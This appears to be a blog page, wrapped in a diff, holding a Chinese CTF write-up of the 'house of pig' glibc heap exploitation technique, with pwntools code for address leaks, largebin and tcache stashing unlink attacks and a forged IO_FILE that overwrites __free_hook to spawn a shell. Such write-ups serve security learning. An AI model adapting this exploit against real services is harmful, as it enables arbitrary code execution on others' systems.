+size_t new_size = 2 * old_blen + 100;
+char *old_buf = fp-&gt;_IO_buf_base;
+...
+new_buf = malloc (new_size);  0xa0=2*old_blen+100=&gt;old_blen=30=1e
+...
+memcpy (new_buf, old_buf, old_blen); 更改free_hook为system
+        free_hook,
+free (old_buf);
+
+&#x27;&#x27;&#x27;</span>
+
+<span class="hljs-string">&#x27;&#x27;&#x27;
+old_buff    :/bin/sh\x00 p64(system_addr)
+old_buf+0x10:p64(system_addr)
+
+free_hook-0x20(new_buf):
+free_hook-0x10:/bin/sh\x00 p64(system_addr)
+free_hook:p64(system_addr)
+
+free (old_buf) = free(free_hook-0x10) =system(/bin/sh)
+&#x27;&#x27;&#x27;</span>
+system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
+fake_IO_FILE = <span class="hljs-number">2</span>*p64(<span class="hljs-number">0</span>)
+fake_IO_FILE += p64(<span class="hljs-number">1</span>)                                  <span class="hljs-comment">#change _IO_write_base = 1</span>
+fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffff</span>)             <span class="hljs-comment">#change _IO_write_ptr = 0xffffffffffff</span>
+fake_IO_FILE += p64(<span class="hljs-number">0</span>)
+fake_IO_FILE += p64(heap_base+<span class="hljs-number">0x148a0</span>)                          <span class="hljs-comment">#v4=&gt; addr(/bin/sh)</span>
+fake_IO_FILE += p64(heap_base+<span class="hljs-number">0x148b8</span>)                          <span class="hljs-comment">#v5</span>
+fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
+fake_IO_FILE += p64(<span class="hljs-number">0</span>)                                  <span class="hljs-comment">#change _mode = 0</span>
+fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
+fake_IO_FILE += p64(IO_str_vtable)              <span class="hljs-comment">#change vtable</span>
+payload = fake_IO_FILE + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-number">2</span>*p64(system_addr) <span class="hljs-comment">#大小是0xE8</span>
+<span class="hljs-string">&#x27;&#x27;&#x27;
+Gift:
+...
+...
+...
+...
+...
+/bin/sh\x00 &lt;-heap_base+0x148a0=old_buff=_IO_buf_base
+p64(system_addr)
+p64(system_addr)
+&#x27;&#x27;&#x27;</span>
+sa(<span class="hljs-string">&#x27;Gift:&#x27;</span>, payload)
+
+<span class="hljs-comment"># dbg(text)</span>
+<span class="hljs-comment"># pause()</span>
+
+Menu(<span class="hljs-number">5</span>)
+sla(<span class="hljs-string">&#x27;user:\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#触发exit(-1)</span>
+
+irt()
+</code></pre>
+<p>下面分part调试</p>
+<h3 id="part1"><a class="markdownIt-Anchor" href="#part1"></a> part1</h3>
+<p>首先为 tcache_stashing_unlink_attack攻击作准备，将5个chunk放入tcache中，并且放入两个同大小的chunk到smallbin中，</p>
+<pre class="highlight"><code class="python"><span class="hljs-comment">#----- prepare tcache_stashing_unlink_attack</span>
+Change(<span class="hljs-number">2</span>)
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):
+        Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># B0~B4</span>
+        Del(x)  <span class="hljs-comment"># B0~B4，在tcache:0xa0的地方填充5个chunk</span>
+Change(<span class="hljs-number">1</span>)
+Add(<span class="hljs-number">0x150</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span>) <span class="hljs-comment"># A0</span>
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
+        Add(<span class="hljs-number">0x150</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x68</span>) <span class="hljs-comment"># A1~A7</span>
+        Del(<span class="hljs-number">1</span>+x)    <span class="hljs-comment">#在tcache:0x160的地方填充7个chunk</span>
+Del(<span class="hljs-number">0</span>)              <span class="hljs-comment">#A0会被释放到unsorted bin</span>
+<span class="hljs-comment">#debug()</span>
+Change(<span class="hljs-number">2</span>)           <span class="hljs-comment">#</span>
+Add(<span class="hljs-number">0xb0</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># B5 split 0x160 to 0xc0 and 0xa0 分割在unsorted bin中的A0为0xa0(后面A0进small bin中，为tcache_stashing_unlink_attack作准备)</span>
+
+Change(<span class="hljs-number">1</span>)            <span class="hljs-comment">#会修改flag标志为0，可以绕过检查，造成UAF漏洞</span>
+Add(<span class="hljs-number">0x180</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x78</span>) <span class="hljs-comment"># A8 会让unsorted bin中0xa0大小的chunk进入small bins中</span>
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):
+        Add(<span class="hljs-number">0x180</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x78</span>) <span class="hljs-comment"># A9~A15</span>
+        Del(<span class="hljs-number">9</span>+x)    <span class="hljs-comment">#填满tcache:0x190</span>
+Del(<span class="hljs-number">8</span>)              <span class="hljs-comment">#A8进入unsorted bin</span>
+
+Change(<span class="hljs-number">2</span>)           
+Add(<span class="hljs-number">0xe0</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x38</span>) <span class="hljs-comment"># B6 split 0x190 to 0xf0 and 0xa0 再次划分A8，因为small bin中至少要两个才可以触发</span>
+Change(<span class="hljs-number">1</span>)
+Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A16，此时A8+0xf0(0xa0)从unsorted bin进入small bin</span>
+</code></pre>
+<p><img data-src="/images/house_of_pigs/1.jpg" alt="" /></p>
+<h3 id="part2-leak-libc_base-and-heap_base"><a class="markdownIt-Anchor" href="#part2-leak-libc_base-and-heap_base"></a> part2 leak libc_base and heap_base</h3>
+<p>泄露libc和heap的基地址</p>
+<pre class="highlight"><code class="python">Change(<span class="hljs-number">2</span>)
+Add(<span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x48</span>) <span class="hljs-comment"># B7</span>
+Change(<span class="hljs-number">1</span>)
+Del(<span class="hljs-number">16</span>)             <span class="hljs-comment">#A16进入unsorted bin</span>
+Change(<span class="hljs-number">2</span>)
+Add(<span class="hljs-number">0x440</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># B8 ，导致A16从unsorted bin进入large bin</span>
+Change(<span class="hljs-number">1</span>)
+Show(<span class="hljs-number">16</span>)
+ru(<span class="hljs-string">&#x27;message is: &#x27;</span>)
+libc_base = uu64(rl()) - <span class="hljs-number">0x1ebfe0</span>
+lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)
+
+Edit(<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0xf</span>+<span class="hljs-string">b&#x27;\n&#x27;</span>)
+Show(<span class="hljs-number">16</span>)
+ru(<span class="hljs-string">&#x27;message is: &#x27;</span>+<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0xf</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)  <span class="hljs-comment">#为了方便泄露，把libc的地址覆盖为A</span>
+heap_base = uu64(rl()) - <span class="hljs-number">0x13940</span>
+lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)
+Edit(<span class="hljs-number">16</span>, <span class="hljs-number">2</span>*p64(libc_base+<span class="hljs-number">0x1ebfe0</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover</span>
+</code></pre>
+<p>创建一个可以放入largebin中的chunk(A16)，然后利用UAF泄露地址，可以本地先算偏移<br />
+<img data-src="/images/house_of_pigs/2.jpg" alt="" /><br />
+<img data-src="/images/house_of_pigs/3.jpg" alt="" /></p>
+<h3 id="part3-first-largebin_attack"><a class="markdownIt-Anchor" href="#part3-first-largebin_attack"></a> part3 first largebin_attack</h3>
+<p>往<code>__free_hook</code>相关的地址上写入堆上的地址</p>
+<pre class="highlight"><code class="python">Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A17=A16   </span>
+
+Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A18</span>
+Add(<span class="hljs-number">0x430</span>, <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x158</span>) <span class="hljs-comment"># A19</span>
+
+Change(<span class="hljs-number">2</span>)
+Del(<span class="hljs-number">8</span>)                <span class="hljs-comment">#B8(0x450)进入unsorted bin</span>
+
+Add(<span class="hljs-number">0x450</span>, <span class="hljs-string">&#x27;B&#x27;</span>*<span class="hljs-number">0x168</span>) <span class="hljs-comment"># B9，会导致B8进入largen bin</span>
+
+Change(<span class="hljs-number">1</span>)             
+Del(<span class="hljs-number">17</span>)               <span class="hljs-comment"># A17进入unsorted bin  </span>
+
+Change(<span class="hljs-number">2</span>)
+free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
+Edit(<span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(free_hook-<span class="hljs-number">0x28</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment">#利用UAF，角色2修改B8的bk_nextsize为free_hook-0x28</span>
+</code></pre>
+<p><img data-src="/images/house_of_pig/4.jpg" alt="" /><br />
+<img data-src="/images/house_of_pig/5.jpg" alt="" /><br />
+接着触发largebin_attack，注意这里虽然申请的是<code>0xa0</code>大小的，并且unsortedbin中只有比这个大小大的chunk(A17)，但unsortedbin的分配机制是：会先把A17放入largenbin，再分割申请所需的大小出去，剩下的再插回unsortedbin。所以仍然会触发largebin_attack</p>
+<pre class="highlight"><code class="python">Change(<span class="hljs-number">3</span>)
+Add(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># C0 triger largebin_attack, write a heap addr to __free_hook-8</span>
+
+Change(<span class="hljs-number">2</span>)
+Edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>*p64(heap_base+<span class="hljs-number">0x13e80</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover 恢复B8的fd_nextsize=bk_nextsize=addr(B8)</span>
+</code></pre>
+<p><img data-src="/images/house_of_pig/6.jpg" alt="" /><br />
+此时<code>__free_hook-0x8</code>的地方就写上了堆上的地址(B8)</p>
+<h3 id="part4-second-largebin_attack"><a class="markdownIt-Anchor" href="#part4-second-largebin_attack"></a> part4 second largebin_attack</h3>
+<p>往<code>_IO_list_all</code>相关的地址写入堆上的地址，方便我们触发伪造的IO链</p>
+<pre class="highlight"><code class="python">Change(<span class="hljs-number">3</span>)
+Add(<span class="hljs-number">0x380</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x118</span>) <span class="hljs-comment"># C1=A17+0xb0</span>
+
+Change(<span class="hljs-number">1</span>)
+Del(<span class="hljs-number">19</span>)               <span class="hljs-comment"># A19进入unsorted bin</span>
+
+Change(<span class="hljs-number">2</span>)
+IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]
+Edit(<span class="hljs-number">8</span>, p64(<span class="hljs-number">0</span>) + p64(IO_list_all-<span class="hljs-number">0x20</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>)
+</code></pre>
+<p>跟第一次largebin attach差不多<br />
+<img data-src="/images/house_of_pig/7.jpg" alt="" /><br />
+可以看到B8的<code>bk_nextsize</code>被更改了<br />
+接下来触发攻击后</p>
+<pre class="highlight"><code class="python">Change(<span class="hljs-number">3</span>)
+Add(<span class="hljs-number">0xa0</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># C2 triger largebin_attack, write a heap addr to _IO_list_all</span>
+
+Change(<span class="hljs-number">2</span>)
+Edit(<span class="hljs-number">8</span>, <span class="hljs-number">2</span>*p64(heap_base+<span class="hljs-number">0x13e80</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># recover</span>
+</code></pre>
+<p><img data-src="/images/house_of_pigs/8.jpg" alt="" /><br />
+可以看到<code>_IO_list_all-&gt;B8</code></p>
+<h3 id="part5-tcache_stashing_unlink_attack"><a class="markdownIt-Anchor" href="#part5-tcache_stashing_unlink_attack"></a> part5 tcache_stashing_unlink_attack</h3>
+<pre class="highlight"><code class="python">Change(<span class="hljs-number">1</span>)
+payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x50</span> + p64(heap_base+<span class="hljs-number">0x12280</span>) + p64(free_hook-<span class="hljs-number">0x20</span>)
+<span class="hljs-comment"># A0=heap_base+0x12280</span>
+Edit(<span class="hljs-number">8</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)
+此时smallbin中的布局，`free_hook-<span class="hljs-number">0x20</span>`被成功写入到smallbin中
+</code></pre>
+<p><img data-src="/images/house_of_pigs/9.jpg" alt="" /></p>
+<pre class="highlight"><code class="python">Change(<span class="hljs-number">3</span>)
+payload = <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span> + p64(heap_base+<span class="hljs-number">0x147c0</span>)
+payload = payload.ljust(<span class="hljs-number">0x158</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
+Add(<span class="hljs-number">0x440</span>, payload) <span class="hljs-comment"># C3 change fake FILE _chain，申请出B8</span>
+</code></pre>
+<p><img data-src="/images/house_of_pigs/10.jpg" alt="" /><br />
+先在unsortedbin中找，大小不合适，把A19+0xb0加入smallbin中，然后把B8拿来使用，即C3=B8，同时在B8处伪IO_FILE的<code>_chain</code>字段为<code>A19+0xb0</code><br />
+<img data-src="/images/house_of_pigs/22.jpg" alt="" /></p>
+<pre class="highlight"><code class="python">Add(<span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;C&#x27;</span>*<span class="hljs-number">0x28</span>) <span class="hljs-comment"># C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache</span>
+</code></pre>
+<p><img data-src="/images/house_of_pigs/11.jpg" alt="" /><br />
+此时<code>__free_hook-0x10</code>进入了<code>tcache</code>中，注意由于这里是用角色3申请的，<code>0x90</code>大小的会把smallbin中的<code>A0+0xa0</code>拿来使用，而后面的Gift申请的<code>0xE8</code>大小的则是从<code>A19+0xb0</code>拿出<code>0xf0</code>取分配。而后面就是把伪造的IO_FILE的内容写到``A19+0xb0`上了</p>
+<h3 id="part6-io_file-attach"><a class="markdownIt-Anchor" href="#part6-io_file-attach"></a> part6 IO_FILE attach</h3>
+<p>现在就是要从tcache中拿出<code>__free_hook-0x10</code>，但没有<code>malloc</code>。<br />
+但程序中有地方调用exit，而exit触发_IO_file_overflow，而_IO_file_overflow根据IO的虚表选择对应的函数，如果劫持虚表为_IO_str_jumps，就会调用_IO_str_overflow，构造IO_FILE，就可以通过_IO_str_overflow调用malloc、memcpy、free</p>
+<p>利用思路就是</p>
+<ul>
+<li>malloc申请<code>__free_hook-0x20</code>出来</li>
+<li>利用memcpy将system函数的地址写到<code>__free_hook</code>上</li>
+<li>最后利用free释放掉一个写有<code>/bin/sh\x00</code>的地址即可</li>
+</ul>
+<pre class="highlight"><code class="python">IO_str_vtable = libc_base + <span class="hljs-number">0x1ED560</span>  
+</code></pre>
+<p><img data-src="/images/house_of_pigs/12.jpg" alt="" /></p>
+<pre class="highlight"><code class="python">system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]
+fake_IO_FILE = <span class="hljs-number">2</span>*p64(<span class="hljs-number">0</span>)
+fake_IO_FILE += p64(<span class="hljs-number">1</span>)                                  <span class="hljs-comment">#change _IO_write_base = 1</span>
+fake_IO_FILE += p64(<span class="hljs-number">0xffffffffffff</span>)             <span class="hljs-comment">#change _IO_write_ptr = 0xffffffffffff</span>
+fake_IO_FILE += p64(<span class="hljs-number">0</span>)
+fake_IO_FILE += p64(heap_base+<span class="hljs-number">0x148a0</span>)                          <span class="hljs-comment">#v4=&gt; addr(/bin/sh)</span>
+fake_IO_FILE += p64(heap_base+<span class="hljs-number">0x148b8</span>)                          <span class="hljs-comment">#v5</span>
+fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
+fake_IO_FILE += p64(<span class="hljs-number">0</span>)                                  <span class="hljs-comment">#change _mode = 0</span>
+fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)
+fake_IO_FILE += p64(IO_str_vtable)              <span class="hljs-comment">#change vtable</span>
+payload = fake_IO_FILE + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-number">2</span>*p64(system_addr) <span class="hljs-comment">#大小是0xE8</span>
+
+sa(<span class="hljs-string">&#x27;Gift:&#x27;</span>, payload) <span class="hljs-comment"># C5</span>
+
+Menu(<span class="hljs-number">5</span>)
+sla(<span class="hljs-string">&#x27;user:\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment">#触发exit(-1)</span>
+</code></pre>
+<p><img data-src="/images/house_of_pigs/23.jpg" alt="" /><br />
+<img data-src="/images/house_of_pig/13.jpg" alt="" /><br />
+而<code>_IO_buf_end</code>和<code>_IO_buf_base</code>的计算，再看看利用链</p>
+<pre class="highlight"><code class="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span>
+
+<span class="hljs-type">size_t</span> old_blen = _IO_blen (fp);
+
+<span class="hljs-type">size_t</span> new_size = <span class="hljs-number">2</span> * old_blen + <span class="hljs-number">100</span>;
+...
+new_buf = <span class="hljs-built_in">malloc</span> (new_size);
+...
+<span class="hljs-built_in">memcpy</span> (new_buf, old_buf, old_blen);
+<span class="hljs-built_in">free</span> (old_buf);
+</code></pre>
+<p>希望<code>new_size=0xa0</code>，推出<code>old_blen=0x1e</code><br />
+而我们申请出来的是<code>__free_hook-0x20</code>，期望</p>
+<pre class="highlight"><code class="">__free_hook-0x20:
+__free_hook-0x10:
+__free_hook     :system_addr
+</code></pre>
+<p>由于我们的fake_IO_FILE后面跟着<code>b'/bin/sh\x00' + 2*p64(system_addr)</code>，那么把从<code>/bin/sh\x00</code>开始的地址写入<code>0x18</code>到<code>__free_hook-0x20</code>即可满足要求</p>
+<pre class="highlight"><code class="">__free_hook-0x20:
+__free_hook-0x10:/bin/sh\x00  system_addr
+__free_hook     :system_addr  
+</code></pre>
+<p><img data-src="/images/house_of_pigs/15.jpg" alt="" /><br />
+和我们的预期一样，这里调试，可以在<code>_IO_str_overflow</code>下断点，运行到这里后再在<code>free</code>下断点</p>
+<p>那么<code>old_blen=0x18</code>，<code>old=buf=C5+0xE8-0x18=C5+d0</code>，根据偏移得到地址<br />
+<img data-src="/images/house_of_pigs/14.jpg" alt="" /><br />
+这里虽然<code>old_len=0x18&lt;0x1e</code>，但堆的申请都是向上取，所以可以申请到<br />
+最后<code>free(old_buf)</code>，而<code>old_buf</code>也恰好保存了<code>/bin/sh</code>，即可getshell</p>
+
+      <div class="tags">
+          <a href="/tags/pwn/" rel="tag"><i class="ic i-tag"></i> pwn</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2023-04-16 13:50:35" itemprop="dateModified" datetime="2023-04-16T13:50:35+08:00">2023-04-16</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="岚沐 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="岚沐 Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="岚沐 PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>岚沐 <i class="ic i-at"><em>@</em></i>CTFer
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2023/04/16/house-of-pig/" title="house_of_pig">http://example.com/2023/04/16/house-of-pig/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/04/16/tcache-stashing-unlink-attack/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipevuctzzj20zk0m84qp.jpg" title="tcache_stashing_unlink_attack">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>tcache_stashing_unlink_attack</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#io_file%E7%9B%B8%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text"> IO_FILE相关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-pig"><span class="toc-number">2.</span> <span class="toc-text"> house of pig</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text"> 题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part1"><span class="toc-number">2.2.</span> <span class="toc-text"> part1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part2-leak-libc_base-and-heap_base"><span class="toc-number">2.3.</span> <span class="toc-text"> part2 leak libc_base and heap_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part3-first-largebin_attack"><span class="toc-number">2.4.</span> <span class="toc-text"> part3 first largebin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part4-second-largebin_attack"><span class="toc-number">2.5.</span> <span class="toc-text"> part4 second largebin_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part5-tcache_stashing_unlink_attack"><span class="toc-number">2.6.</span> <span class="toc-text"> part5 tcache_stashing_unlink_attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part6-io_file-attach"><span class="toc-number">2.7.</span> <span class="toc-text"> part6 IO_FILE attach</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="岚沐"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">岚沐</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">27</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">6</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>About</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/10/29/2022-hackgame%E5%A4%8D%E7%8E%B0/" title="2022-hackgame复现">2022-hackgame复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/06/2022Nepnep%E8%B7%A8%E5%B9%B4%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0%E5%92%8C%E6%80%BB%E7%BB%93/" title="2022Nepnep跨年比赛复现和总结">2022Nepnep跨年比赛复现和总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/23/BUU-Crypto/" title="BUU_Crypto">BUU_Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/13/Crypto%E5%A4%8D%E7%8E%B01/" title="Crypto复现1">Crypto复现1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/03/08/SROP/" title="SROP">SROP</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/08/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/07/Lucky-7-%E4%BA%8C%E5%85%83%E9%9D%9E%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B%E7%BB%84/" title="Lucky 7 二元非线性同余方程组">Lucky 7 二元非线性同余方程组</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/29/NTRU/" title="NTRU">NTRU</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/24/%E9%95%BF%E5%9F%8E%E6%9D%AFCrypto/" title="长城杯Crypto">长城杯Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/03/%E6%A0%BC%E5%AF%86%E7%A0%81/" title="格密码">格密码</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">岚沐 @ Arashimuのblog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/04/16/house-of-pig/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
